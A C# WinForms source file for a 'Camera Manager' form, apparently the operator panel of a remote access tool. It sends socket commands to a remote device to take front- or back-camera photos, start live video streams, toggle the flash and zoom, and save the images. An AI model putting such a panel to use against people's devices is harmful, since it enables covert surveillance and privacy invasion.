﻿using System;
using System.Drawing;
using System.Net.Sockets;
using System.Windows.Forms;

namespace Server.Views
{
    public partial class Camera : Form
    {
        Socket soketimiz;
        public string ID = "";
        public int max = 0;
        public int zoom = 0;
        public Camera(Socket s, string aydi)
        {
            soketimiz = s;
            ID = aydi;
            InitializeComponent();
            comboBox5.SelectedItem = "Rotate270FlipX";
            comboBox7.SelectedIndex = 3;

        }
        private void button1_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(comboBox6.SelectedItem.ToString()))
            {
                label1.Visible = false;
                try
                {
                    if (comboBox6.SelectedItem.ToString() == "1")
                    {
                        if (string.IsNullOrEmpty(comboBox1.SelectedItem.ToString()))
                        {
                            MessageBox.Show("Lütfen ön kamera için bir çözünürlük seçin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                            return;
                        }
                    }
                    else
                    {
                        if (string.IsNullOrEmpty(comboBox2.SelectedItem.ToString()))
                        {
                            MessageBox.Show("Lütfen arka kamera için bir çözünürlük seçin.", "Uyarı", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                            return;
                        }
                    }
                    Text = "Camera Manager";
                    string cam = "";
                    string flashmode = "";
                    string resolution = "";
                    cam = comboBox6.SelectedItem.ToString().Replace("Front: ", "").Replace("Back: ", "");
                    button1.Enabled = false;
                    ((Control)tabPage2).Enabled = false;
                    flashmode = checkBox1.Checked ? "1" : "0";
                    resolution = comboBox6.SelectedItem.ToString() == "1" ? comboBox1.SelectedItem.ToString() : comboBox2.SelectedItem.ToString();
                    MainWindow.GoToOurSocket("CAM", "[VERI]" + cam + "[VERI]" + flashmode + "[VERI]" + resolution + "[VERI][0x09]", soketimiz);
                    label2.Text = "Çekiliyor..";
                }
                catch (Exception) { }

            }
            else
            {
                MessageBox.Show("Please select a camera", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                return;
            }
        }
        public Image RotateImage(Image img)
        {
            Bitmap bmp = new Bitmap(img);
            using (Graphics gfx = Graphics.FromImage(bmp))
            {
                gfx.Clear(Color.White);
                gfx.DrawImage(img, 0, 0, img.Width, img.Height);
            }

            bmp.RotateFlip(RotateFlipType.Rotate90FlipNone);
            return bmp;
        }
        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            if (tabControl1.SelectedIndex == 0)
            {
                if (pictureBox1.Image != null)
                {
                    pictureBox1.Image = RotateImage(pictureBox1.Image);
                }
            }
        }
        public void save(PictureBox pcbx)
        {
            if (pcbx.Image != null)
            {
                using (SaveFileDialog op = new SaveFileDialog())
                {
                    op.Filter = "Resim dosyası (*.png)|*.png";
                    op.Title = "Fotoğrafı kaydet";
                    if (op.ShowDialog() == DialogResult.OK)
                    {
                        try
                        {
                            pcbx.Image.Save(op.FileName);
                        }
                        catch (Exception ex) { MessageBox.Show(ex.Message, "Kayıt", MessageBoxButtons.OK, MessageBoxIcon.Exclamation); }
                    }
                }
            }
        }
        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            save((tabControl1.SelectedIndex == 0) ? pictureBox1 : pictureBox2);
        }
        public bool enabled = false;
        public bool zoomSupport = false;
        private void button4_Click(object sender, EventArgs e)
        {

            if (enabled == false)
            {
                if (!string.IsNullOrEmpty(comboBox6.SelectedItem.ToString()))
                {
                    ((Control)tabControl1.TabPages[0]).Enabled = false;
                    Text = "Camera Manager";
                    button4.Text = "Stop";
                    label2.Text = "...";
                    string cam = "";
                    string flashmode = "";
                    string resolution = "";
                    cam = comboBox6.SelectedItem.ToString().Replace("Front: ", "").Replace("Back: ", "");  // 1 ön kamera
                    flashmode = checkBox2.Checked ? "1" : "0";
                    label1.Visible = false;
                    resolution = comboBox4.SelectedItem.ToString();
                    MainWindow.GoToOurSocket("LIVESTREAM", "[VERI]" + cam + "[VERI]" + flashmode + "[VERI]" + resolution + "[VERI]" + comboBox3.SelectedItem.ToString().Replace("%", "") +
                      "[VERI][0x09]", soketimiz);
                    enabled = true;
                }
                else
                {
                    MessageBox.Show("Please select a camera", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
                    return;
                }
            }
            else
            {
                MainWindow.GoToOurSocket("LIVESTOP", "[VERI][0x09]", soketimiz);
                button4.Enabled = false; button4.Text = "Wait..";

            }
        }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            if (button4.Text == "Stop")
            {
                if (checkBox2.Checked)
                {
                    MainWindow.GoToOurSocket("LIVEFLASH", "[VERI]1[VERI][0x09]", soketimiz);
                }
                else
                {
                    MainWindow.GoToOurSocket("LIVEFLASH", "[VERI]0[VERI][0x09]", soketimiz);
                }
            }
        }

        private void comboBox3_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (button4.Text == "Stop")
            {
                if (!string.IsNullOrEmpty(comboBox3.SelectedItem.ToString()))
                {
                    MainWindow.GoToOurSocket("QUALITY", $"[VERI]{comboBox3.SelectedItem.ToString().Replace("%", "")}[VERI][0x09]", soketimiz);
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {

            if (zoom < max)
            {
                zoom += 1;
                MainWindow.GoToOurSocket("ZOOM", $"[VERI]{zoom}[VERI][0x09]", soketimiz);
                label5.Text = "Zoom: " + zoom.ToString();
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (zoom > 0)
            {
                zoom -= 1;
                MainWindow.GoToOurSocket("ZOOM", $"[VERI]{zoom}[VERI][0x09]", soketimiz);
                label5.Text = "Zoom: " + zoom.ToString();
            }
        }
        private static int lastTick;
        private static int lastFrameRate;
        private static int frameRate;

        public int CalculateFrameRate()
        {
            if (Environment.TickCount - lastTick >= 1000)
            {
                lastFrameRate = frameRate;
                frameRate = 0;
                lastTick = Environment.TickCount;
            }
            frameRate++;
            return lastFrameRate;
        }
        private void Kamera_FormClosing(object sender, FormClosingEventArgs e)
        {
            MainWindow.GoToOurSocket("LIVESTOP", "[VERI][0x09]", soketimiz);
        }

        private void comboBox5_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (comboBox5.SelectedIndex)
            {
                case 0:
                    MainWindow.rotateFlip = RotateFlipType.Rotate270FlipX;
                    break;
                case 1:
                    MainWindow.rotateFlip = RotateFlipType.Rotate180FlipX;
                    break;
                case 2:
                    MainWindow.rotateFlip = RotateFlipType.Rotate90FlipX;
                    break;
            }
        }

        private void label10_TextChanged(object sender, EventArgs e)
        {
            int fps = int.Parse(label10.Text.Replace("Fps: ", ""));
            if (fps <= 5 && fps >= 0)
            {
                label10.ForeColor = Color.Red;
            }
            if (fps >= 6 && fps <= 10)
            {
                label10.ForeColor = Color.Orange;
            }
            if (fps > 10 && fps <= 15)
            {
                label10.ForeColor = Color.LightGreen;
            }
            if (fps > 15)
            {
                label10.ForeColor = Color.Green;
            }
        }

        private void comboBox7_SelectedIndexChanged(object sender, EventArgs e)
        {
            switch (comboBox7.SelectedIndex)
            {
                case 0:
                    pictureBox2.SizeMode = PictureBoxSizeMode.Normal;
                    break;
                case 1:
                    pictureBox2.SizeMode = PictureBoxSizeMode.StretchImage;
                    break;
                case 2:
                    pictureBox2.SizeMode = PictureBoxSizeMode.AutoSize;
                    break;
                case 3:
                    pictureBox2.SizeMode = PictureBoxSizeMode.Zoom;
                    break;
                case 4:
                    pictureBox2.SizeMode = PictureBoxSizeMode.CenterImage;
                    break;
            }
        }
    }
}